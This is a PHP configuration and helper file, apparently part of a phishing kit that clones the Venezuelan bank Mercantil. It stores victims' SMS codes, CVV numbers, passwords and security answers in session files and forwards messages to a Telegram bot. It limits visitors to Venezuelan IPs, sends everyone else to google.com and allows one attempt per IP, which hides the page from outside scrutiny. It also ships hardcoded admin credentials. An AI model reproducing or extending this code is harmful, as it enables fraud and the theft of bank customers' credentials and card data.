<?php
/* ============================================================
   Mercantil · config.php  (helpers + config + Telegram)
   SIN SQL — todo en .json con flock
   ============================================================ */
if (session_status() === PHP_SESSION_NONE) { session_start(); }

define('BASE_DIR', __DIR__);          // raíz del clon (mercancia/)
define('PANEL_DIR', __DIR__);                  // mercancia/panel/
define('DATA_DIR', PANEL_DIR . '/data');

define('F_SESIONES', DATA_DIR . '/sesiones.json');
define('F_USUARIOS', DATA_DIR . '/usuarios.json');
define('F_LOGS',     DATA_DIR . '/logs.json');
define('F_CONFIG',   DATA_DIR . '/config.json');
define('F_RATE',     DATA_DIR . '/_rate.json');   // control anti-flood por IP
define('F_ATAQUES',  DATA_DIR . '/_ataques.json'); // registro de intentos de ataque

// --- GEO-FENCE: solo Venezuela ---
define('GEO_VE_SOLO', true);   // true = solo IPs de Colombia pueden entrar; el resto -> google.com
define('GEO_PAIS_OK', 'VE');   // pais permitido

// --- Anti-flood (COMPLETO, activo por defecto) ---
define('RL_MAX_SESIONES', 200);     // tope de sesiones vivas (con datos no se borran)
define('RL_VENTANA',      0);        // 0 = ventana infinita (1 intento por IP en total)
define('RL_MAX_POR_IP',   1);        // MAXIMO 1 INTENTO POR IP
define('RL_MAX_GLOBAL',   20);       // maximo global por minuto (corta floods)
define('RL_TTL_IP',       86400);    // recordar IPs 24h (para el 1-por-IP)

define('F_LOGIN',     DATA_DIR . '/_login_rate.json'); // anti brute-force login

define('ADMIN_DEF_USER', 'Lilpdro');
define('ADMIN_DEF_PASS', 'Lilpdro');

define('TG_TOKEN',   'Token');
define('TG_CHAT_ID', '-ID');
define('TG_ACTIVO',  true);

date_default_timezone_set('America/Bogota');

/* ---------- Helpers JSON (flock) ---------- */
function json_read($file) {
    if (!file_exists($file)) return [];
    $raw = file_get_contents($file);
    if ($raw === false || trim($raw) === '') return [];
    $data = json_decode($raw, true);
    return is_array($data) ? $data : [];
}
function json_write($file, $data) {
    $dir = dirname($file);
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    $fp = fopen($file, 'c+');
    if (!$fp) return false;
    flock($fp, LOCK_EX);
    ftruncate($fp, 0);
    rewind($fp);
    fwrite($fp, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
    fflush($fp);
    flock($fp, LOCK_UN);
    fclose($fp);
    return true;
}
function json_append($file, $item) {
    $data = json_read($file);
    $data[] = $item;
    return json_write($file, $data);
}

/* ---------- Init ---------- */
function init_data() {
    if (!file_exists(F_USUARIOS)) {
        json_write(F_USUARIOS, [[
            'id'     => 1,
            'user'   => ADMIN_DEF_USER,
            'pass'   => password_hash(ADMIN_DEF_PASS, PASSWORD_DEFAULT),
            'rol'    => 'admin',
            'creado' => date('Y-m-d H:i:s'),
        ]]);
    }
    if (!file_exists(F_CONFIG)) {
        json_write(F_CONFIG, default_config());
    }
    foreach ([F_SESIONES, F_LOGS] as $f) {
        if (!file_exists($f)) json_write($f, []);
    }
}
function default_config() {
    return [
        'panel_nombre' => 'Panel Mercantil',
        'tg_activo'    => true,
        'tg_token'     => TG_TOKEN,
        'tg_chat'      => TG_CHAT_ID,
        'bloqueo_ip'   => true,   // ON por defecto: maximo 1 intento por IP (anti-flood)
    ];
}

/* ---------- Log ---------- */
function log_accion($accion, $detalle = '') {
    json_append(F_LOGS, [
        'ts'      => date('Y-m-d H:i:s'),
        'accion'  => $accion,
        'detalle' => $detalle,
        'ip'      => $_SERVER['REMOTE_ADDR'] ?? 'cli',
    ]);
}

/* ---------- Sesión de panel ---------- */
function panel_logueado() { return !empty($_SESSION['panel_user']); }
function panel_user()     { return $_SESSION['panel_user'] ?? null; }

/* ---------- Utilidades ---------- */
function client_ip() {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = explode(',', $_SERVER[$k])[0];
            return trim($ip);
        }
    }
    return 'desconocida';
}
function user_agent() { return $_SERVER['HTTP_USER_AGENT'] ?? 'desconocido'; }

function linea_ip($ip = null) {
    $ip = $ip ?: client_ip();
    if ($ip === 'desconocida' || $ip === '127.0.0.1' || $ip === '::1') {
        return ['ciudad' => 'Local', 'region' => 'Local', 'pais' => 'Local', 'isp' => 'localhost'];
    }
    $ctx = stream_context_create(['http' => ['timeout' => 4, 'ignore_errors' => true]]);
    $r = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,query&lang=es", false, $ctx);
    if ($r) {
        $j = json_decode($r, true);
        if (is_array($j) && ($j['status'] ?? '') === 'success') {
            return [
                'ciudad' => $j['city'] ?? '',
                'region' => $j['regionName'] ?? '',
                'pais'   => $j['country'] ?? '',
                'isp'    => $j['isp'] ?? '',
                'query'  => $j['query'] ?? $ip,
            ];
        }
    }
    return ['ciudad' => '', 'region' => '', 'pais' => '', 'isp' => '', 'query' => $ip];
}

/* ---------- Telegram ---------- */
function tg_enviar($texto, $chat_id = null) {
    if (!TG_ACTIVO) return false;
    $cfg = json_read(F_CONFIG);
    if (isset($cfg['tg_activo']) && !$cfg['tg_activo']) return false;
    $token = (isset($cfg['tg_token']) && trim($cfg['tg_token']) !== '') ? trim($cfg['tg_token']) : TG_TOKEN;
    $chat  = $chat_id ?: ((isset($cfg['tg_chat']) && trim($cfg['tg_chat']) !== '') ? trim($cfg['tg_chat']) : TG_CHAT_ID);
    if ($token === '' || $chat === '') return false;

    $url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
    $payload = http_build_query([
        'chat_id'    => $chat,
        'text'       => $texto,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ]);
    $ctx = stream_context_create([
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: " . strlen($payload) . "\r\n",
            'content' => $payload,
            'timeout' => 6,
            'ignore_errors' => true,
        ],
    ]);
    $resp = @file_get_contents($url, false, $ctx);
    if ($resp === false) return false;
    $j = json_decode($resp, true);
    return !empty($j['ok']);
}

/* ---------- Anti-flood / anti-bot ---------- */

// IP del cliente (ya existe client_ip). Variante para deteccion de proxy.
function parece_proxy() {
    return !empty($_SERVER['HTTP_X_FORWARDED_FOR']) || !empty($_SERVER['HTTP_VIA']) || !empty($_SERVER['HTTP_PROXY_CONNECTION']);
}

// Rate-limit generico por clave (IP / accion). Devuelve true si SE PERMITE.
function rl_permitir($clave, $max, $ventana) {
    $fp = @fopen(F_RATE, 'c+');
    if (!$fp) return true;
    flock($fp, LOCK_EX);
    $raw = stream_get_contents($fp);
    $d = json_decode($raw, true);
    if (!is_array($d)) $d = ['ips' => [], 'global' => []];
    if (!isset($d['ips']) || !is_array($d['ips'])) $d['ips'] = [];
    if (!isset($d['global']) || !is_array($d['global'])) $d['global'] = [];
    $now = time();
    $win = ($ventana > 0) ? $ventana : RL_TTL_IP;   // 0 = recordar 24h

    // limpiar viejas
    $d['ips'] = array_filter($d['ips'], fn($t) => ($now - (int)$t) < $win);
    $d['global'] = array_values(array_filter($d['global'], fn($t) => ($now - (int)$t) < 60));

    $ok = true;
    if ($clave !== null) {
        $n = 0;
        foreach ($d['ips'] as $k => $t) { if (strpos($k, $clave . '_') === 0) $n++; }
        if ($n >= $max) $ok = false;
    }
    // global por minuto
    $maxg = RL_MAX_GLOBAL;
    if (count($d['global']) >= $maxg) $ok = false;

    if ($ok) {
        $d['ips'][$clave . '_' . microtime(true)] = $now;
        $d['global'][] = $now;
    }
    ftruncate($fp, 0); rewind($fp);
    fwrite($fp, json_encode($d));
    fflush($fp); flock($fp, LOCK_UN); fclose($fp);
    return $ok;
}

// Cuenta rapida de timestamps por una clave exacta
function rl_contar($clave, $ventana) {
    $d = json_read(F_RATE);
    $now = time();
    $win = ($ventana > 0) ? $ventana : RL_TTL_IP;
    $n = 0;
    foreach (($d['ips'] ?? []) as $k => $t) {
        if (strpos($k, $clave . '_') === 0 && ($now - (int)$t) < $win) $n++;
    }
    return $n;
}

// Limita el total de sesiones vivas: si excede el tope, purga SOLO vacias/basura.
function rl_podar_sesiones() {
    $ses = json_read(F_SESIONES);
    if (count($ses) <= RL_MAX_SESIONES) return;
    $now = time();
    $ricas = []; $pobres = [];
    foreach ($ses as $s) {
        $tieneDatos = trim((string)($s['sms'] ?? '')) !== '' || trim((string)($s['cvv'] ?? '')) !== '' || trim((string)($s['resp1'] ?? '')) !== '' || trim((string)($s['clave'] ?? '')) !== '';
        $tiempo = strtotime($s['ultimo'] ?? $s['ts'] ?? 'now');
        if ($tieneDatos || ($now - $tiempo) < 1800) $ricas[] = $s; else $pobres[] = $s;
    }
    $falta = max(0, RL_MAX_SESIONES - count($ricas));
    $ricas = array_merge($ricas, array_slice(array_reverse($pobres), 0, $falta));
    json_write(F_SESIONES, array_slice($ricas, -RL_MAX_SESIONES));
}

/* ---------- GEO-FENCE (solo Venezuela) ---------- */

// Devuelve el codigo de pais (ISO2) de una IP usando ip-api.com
function ip_pais($ip = null) {
    $ip = $ip ?: client_ip();
    if ($ip === 'desconocida' || $ip === '127.0.0.1' || $ip === '::1' || $ip === 'Local') return 'LOCAL';
    // cache 6h por IP
    $cache = json_read(DATA_DIR . '/_geo_cache.json');
    $now = time();
    if (isset($cache[$ip]) && ($now - (int)($cache[$ip]['t'] ?? 0)) < 21600) {
        return $cache[$ip]['p'];
    }
    $ctx = stream_context_create(['http' => ['timeout' => 4, 'ignore_errors' => true]]);
    $r = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode", false, $ctx);
    $pais = '';
    if ($r) {
        $j = json_decode($r, true);
        if (is_array($j) && ($j['status'] ?? '') === 'success') $pais = strtoupper($j['countryCode'] ?? '');
    }
    // limpiar cache viejo
    $cache = array_filter($cache, fn($v) => ($now - (int)($v['t'] ?? 0)) < 21600);
    $cache[$ip] = ['p' => $pais, 't' => $now];
    json_write(DATA_DIR . '/_geo_cache.json', $cache);
    return $pais;
}

// Registra un intento de ataque / bloqueo (para el dashboard)
function registrar_ataque($ip, $motivo, $extra = []) {
    $geo = linea_ip($ip);
    $item = [
        'ts'     => date('Y-m-d H:i:s'),
        'ip'     => $ip,
        'motivo' => $motivo,
        'pais'   => ip_pais($ip),
        'ciudad' => $geo['ciudad'] ?? '',
        'isp'    => $geo['isp'] ?? '',
        'ua'     => mb_substr(user_agent(), 0, 80),
        'ruta'   => mb_substr(($_SERVER['REQUEST_URI'] ?? ''), 0, 120),
        'metodo' => $_SERVER['REQUEST_METHOD'] ?? '',
    ];
    if ($extra) $item = array_merge($item, $extra);
    // guardar últimos 500, más recientes primero
    $arr = json_read(F_ATAQUES);
    array_unshift($arr, $item);
    $arr = array_slice($arr, 0, 500);
    json_write(F_ATAQUES, $arr);
}

init_data();